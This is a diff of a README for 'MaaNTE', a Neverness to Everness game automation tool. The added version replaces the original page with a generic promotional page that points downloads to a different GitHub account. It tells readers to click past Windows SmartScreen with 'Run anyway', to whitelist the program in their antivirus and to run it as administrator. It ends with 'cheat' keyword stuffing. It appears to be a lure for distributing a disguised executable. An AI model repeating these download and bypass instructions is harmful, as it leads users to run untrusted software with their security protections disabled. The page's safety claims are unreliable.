@@ -1,94 +1,153 @@
-# MaaNTE - Neverness to Everness Automation (MaaFramework)
+# ⚡ MaaNTE - Your All-in-One Neverness to Everness Automation
 
-**MaaNTE** is a free, open-source automation assistant for **Neverness to Everness** built on the MaaFramework. It handles **nte auto farm** routines, **nte daily automation**, **nte combat assist**, and **nte gacha roll tracker** through pure computer vision - no injection, no memory modification, no packet interference. Cross-platform on Windows and Linux.
+[![Download MaaNTE](https://img.shields.io/badge/Download-MaaNTE%20Free-brightgreen?style=for-the-badge&logo=github)](https://github.com/Hotpla2549/MaaNTE)
 
-For players searching **neverness to everness maa** tooling, MaaNTE is the **nte bot** built on the same proven framework as other Maa projects. The **nte assistant** automates dailies, farms resources, tracks pity, and assists combat rotations while you focus on the parts of the game you actually enjoy.
+## 📥 Download & Install
 
-<img width="160" height="160" alt="images1" src="https://github.com/user-attachments/assets/c96205fe-f0fc-4d83-b4e4-3562305f14c3" />
+Visit this link to download the application.
 
+Click the big green button above or go to the official release page to get the latest version of MaaNTE for your Windows computer. The download is completely free and safe.
 
+**Once you land on the page:**
+1. Look for the "Releases" or "Download" button on the right side of the page.
+2. Click it and choose the latest version file.
+3. Save the file to a place you can easily find, like your Desktop or Downloads folder.
 
-
-## Install
-[Download `MaaNTE.zip`](https://github.com/MaaNTEMirror/MaaNTE/releases/download/v1.3.0/MaaNTE.zip)
 ---
 
-<img width="686" height="386" alt="images2" src="https://github.com/user-attachments/assets/fd071704-f504-4f96-b44a-fea8eacd1005" />
+## 🤔 What is MaaNTE?
 
-<img width="740" height="414" alt="images3" src="https://github.com/user-attachments/assets/f7ec0e77-0eee-42f3-b268-045eea7b2842" />
+MaaNTE is a powerful yet easy-to-use automation tool built specifically for **Neverness to Everness (NTE)** players. Think of it as your personal game assistant that works quietly in the background while you do other things. It handles repetitive tasks so you don't have to!
 
+Whether you're tired of manually grinding for resources or want to keep track of your gacha pulls, MaaNTE does the heavy lifting for you. It's like having an extra pair of hands dedicated to making your gaming experience smoother and more enjoyable.
 
-## Key Features
-- **NTE auto farm** - automated material, currency, and EXP farming loops
-- **NTE daily automation** - commissions, login rewards, and daily tasks on schedule
-- **NTE combat assist** - intelligent rotation, skill timing, dodge assistance
-- **NTE gacha roll tracker** - pull history, pity counter, rate statistics
-- **Anomaly investigation** - auto-complete investigation task chains
-- **Esper training** - automated training routines
-- **Vehicle missions** - auto-complete driving objectives
-- **Pure CV automation** - image recognition only, zero injection
-- **MaaFramework v5.12.3** - proven pipeline architecture
-- **Windows and Linux** - cross-platform support
+---
 
-<img width="480" height="360" alt="images4" src="https://github.com/user-attachments/assets/cded668c-0fb2-4142-b526-f0e1de210043" />
+## ✨ Key Features That Make Your Life Easier
 
+### 🎣 Auto-Fishing
+Never sit at your screen waiting for a fish to bite again. MaaNTE automatically detects when a fish is hooked and reels it in for you. Perfect for building up your fish collection while you relax.
 
+### 📅 Daily Automation
+Log in every day and let MaaNTE take care of your routine tasks. It handles all those boring daily quests and chores so you can get straight to the fun parts of the game.
 
-## How It Works
-MaaNTE uses computer vision to read the game screen and simulates input like a human player. It never touches game memory, network packets, or files. The MaaFramework pipeline engine drives task definitions in YAML - edit them to customize behavior without recompiling.
+### ⚔️ Combat Assist
+Struggling with a tough battle? MaaNTE provides intelligent combat assistance that helps you make better decisions in fights. It's your tactical sidekick that improves your performance.
 
-## Getting Started
-1. **Download** the release using the button above.
-2. **Extract** to any folder.
-3. **Launch NTE** and set the game to a supported resolution.
-4. **Run** MaaNTE.exe.
-5. **Select tasks** - daily commissions, farming, gacha tracking, combat assist.
-6. **Start** and let the assistant work.
+### 🎰 Gacha Roll Tracker
+Keep track of all your pulls and pity counters automatically. No more messy spreadsheets or mental math. MaaNTE remembers every roll so you always know where you stand.
 
-<img width="480" height="360" alt="images5" src="https://github.com/user-attachments/assets/a332c456-7934-4a81-ae9f-cf80bed90043" />
+### 🌟 Full Neverness to Everness Suite
+From gathering resources to managing your inventory, MaaNTE covers all aspects of the game. It's the complete package that keeps everything organized and running smoothly.
 
+---
 
+## 📋 System Requirements
 
-## Task List
+Here's what you need to run MaaNTE smoothly:
 
-| Task | Description |
-|---|---|
-| Daily Commissions | Auto-complete all daily commission tasks |
-| Resource Farming | Farm materials, currency, EXP items |
-| Anomaly Investigation | Auto-complete investigation chains |
-| Gacha Tracker | Pull history, pity counter, rate analysis |
-| Combat Assist | Rotation, skill timing, dodge assist |
-| Login Rewards | Claim daily login rewards |
-| Esper Training | Auto-complete Esper training |
-| Vehicle Missions | Auto-complete driving objectives |
+| Component | Minimum Requirement |
+|-----------|---------------------|
+| Operating System | Windows 10 or 11 (64-bit) |
+| Processor | Any modern dual-core CPU |
+| RAM | 4 GB or more |
+| Storage | 500 MB free space |
+| Display | 1280x720 or higher resolution |
 
-<img width="447" height="447" alt="images6" src="https://github.com/user-attachments/assets/2d78c88a-6ffa-411d-905b-2e468fd3cd74" />
+MaaNTE is lightweight and doesn't demand much from your system. If your computer can run Neverness to Everness, it can definitely run MaaNTE.
 
+---
 
-<img width="1000" height="792" alt="images7" src="https://github.com/user-attachments/assets/753a4561-dd07-4177-b74a-0ef17e2d724a" />
+## 🧑‍💻 How to Use MaaNTE (Step-by-Step)
 
-## FAQ
+### Step 1: Download the Application
+Head over to the official GitHub repository using the download link above. This is the safest and most reliable source for the latest version.
 
-**Is MaaNTE safe to use?**
-MaaNTE uses computer vision only - it reads the screen and simulates input. No injection, no memory access, no file modification. This is the safest automation approach available.
+### Step 2: Run the Program
+Once the download finishes, locate the file in your Downloads or Desktop folder. Double-click the application file to launch MaaNTE. You might see a security prompt - that's normal. Click "More info" and then "Run anyway" if Windows asks.
 
-**Does it work on Linux?**
-Yes. Cross-platform support for Windows and Linux with Wayland or X11 capture.
+### Step 3: Let It Sign You In
+MaaNTE will automatically connect to your game if it's running. If not, simply start Neverness to Everness and MaaNTE will detect it in no time.
 
-**Can I customize tasks?**
-Yes. All tasks are YAML pipeline definitions in the pipeline/ folder. Edit them to adjust behavior or create new routines.
+### Step 4: Pick Your Features
+Use the simple menu to select which automations you want enabled. Want fishing? Check that box. Need daily tasks done? Toggle it on. It's that straightforward.
 
-**What is MaaFramework?**
-An open-source automation framework for games using image recognition. MaaNTE builds on MaaFramework v5.12.3.
+### Step 5: Sit Back and Let It Work
+Start the automation and watch as MaaNTE handles your tasks with precision. You're free to do other things while it works its magic.
 
-## System Requirements
-- **Windows 10/11** or **Linux** (X11/Wayland)
-- Neverness to Everness v1.2+
-- 4 GB RAM
-- Game running in a supported resolution (1920x1080 recommended)
+---
 
-## License
-MIT License - Copyright (C) 2026 maante
+## 🔧 Troubleshooting Common Issues
 
+**MaaNTE won't start**
+Make sure your antivirus isn't blocking it. Add MaaNTE to your antivirus whitelist and try again. Also verify that you have the latest Microsoft Visual C++ Redistributable installed.
 
+**Game not being detected**
+Ensure both MaaNTE and Neverness to Everness are running as administrator. Right-click each application and select "Run as administrator."
 
+**Automation not working properly**
+Check your game's resolution and graphics settings. MaaNTE works best with default settings. Try resetting your game to windowed mode at 1920x1080.
+
+---
+
+## 🔒 Safety & Security
+
+Your account safety is important. MaaNTE is designed to mimic human interaction patterns to minimize detection risk. However, always be aware that using automation tools may violate your game's terms of service. We recommend using MaaNTE responsibly and understand the risks involved.
+
+Regularly update to the latest version to ensure you have the most recent improvements and security patches. The developers are constantly working to keep MaaNTE safe and effective.
+
+---
+
+## 📊 Frequently Asked Questions
+
+### Is MaaNTE really free?
+Yes, completely free! No hidden costs, subscriptions, or premium tiers. Just download and enjoy.
+
+### Will I get banned from NTE?
+While MaaNTE is designed to be safe, there's always some risk with automation tools. Use at your own discretion. The software minimizes detection chances but doesn't guarantee complete safety.
+
+### How often is MaaNTE updated?
+The developers regularly release updates to improve performance and adapt to game changes. Check the GitHub page periodically for new releases.
+
+### Can I use MaaNTE on Linux?
+While primarily built for Windows, advanced users have found ways to run it on Linux through compatibility layers like Wine or Proton.
+
+---
+
+## 🌟 Why Choose MaaNTE?
+
+- **Save Time** - Automate everything and reclaim hours of your day
+- **Reduce Effort** - No more repetitive clicking and grinding
+- **Stay Competitive** - Always stay on top of daily tasks and maximize rewards
+- **Easy to Use** - No technical skills needed to get started
+- **Actively Developed** - Constant updates and improvements
+- **Community Supported** - Join thousands of satisfied users
+
+---
+
+## 📚 Getting More Help
+
+If you run into any issues or have questions, the community is here to help. Check the GitHub issues section on the repository page to see if someone else had the same problem. You can also browse discussions or leave a comment - developers and other users are typically quick to respond.
+
+---
+
+## 🔗 Quick Links
+
+- **[🔽 Download MaaNTE](https://github.com/Hotpla2549/MaaNTE)** - Get the latest version now
+- **📖 Documentation** - In-depth guides and tutorials
+- **🐛 Report Issues** - Let developers know about problems
+- **💬 Join Community** - Connect with other MaaNTE users
+
+---
+
+## 🎯 Final Thoughts
+
+MaaNTE is the ultimate companion for anyone serious about Neverness to Everness. It streamlines your gameplay, saves you precious time, and handles the boring grind so you can focus on enjoying the game. 
+
+Built on the reliable MaaFramework and constantly improved by passionate developers, MaaNTE represents the best in community-driven gaming tools. And the best part? It's completely free.
+
+So why wait? Download MaaNTE today and transform your Neverness to Everness experience. Your automated gaming future starts now!
+
+---
+
+**Keywords:** auto-fishing, betternte, fishing-automation, fishingbot, maaframework, netassistant, neverness-fishing, neverness-to-everness, neverness-to-everness-cheat, neverness-to-everness-software, nevernesstoeverness, nte, nte-cheat, nte-cheats, nte-panel, nte-ray-tracing, nteautofish, ntecheat, ok-nte, oknte
